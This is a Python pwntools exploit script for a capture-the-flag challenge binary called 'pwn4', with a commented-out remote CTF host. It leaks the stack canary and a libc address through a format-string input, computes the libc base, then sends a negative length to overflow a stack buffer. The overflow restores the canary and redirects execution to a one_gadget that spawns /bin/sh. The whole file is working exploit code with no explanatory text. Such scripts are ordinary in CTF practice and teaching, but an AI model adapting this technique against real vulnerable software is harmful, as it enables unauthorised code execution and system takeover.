from pwn import *

def input(size, data):
	r.sendlineafter('>> ', "1")
	r.sendlineafter('Input length : ',str(size))
	r.sendlineafter('Input comment : ', data)

def view():
	r.sendlineafter(">> ",'2')


#r = remote('ctf.kuality.kr',12353)
r = process("./pwn4",env={'LD_PRELOAD':'./libc.so.6'})
#context.log_level = 'debug'
#gdb.attach(r,'b* 0x0000000000400bad')
gdb.attach(r,'b* 0x0000000000400c4b')

r.sendlineafter(">> ",'%27$lx %29$lx')

view()
r.recvuntil("Name : ")

leak = int(r.recv(16),16)
canary = leak
success("canary = " + hex(canary))

r.recv(1)

leak = int(r.recv(12),16)
libc_base = leak - 133168
success("libc_base = " + hex(libc_base))

one_gadget = libc_base + 0x4526a
'''
0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

'''
payload = ''
payload += '\x00'*0x38   		# rsp+0x30 == NULL
payload += p64(canary)
payload += 'B'*0x8
payload += p64(one_gadget)


input(-1,payload)

r.interactive()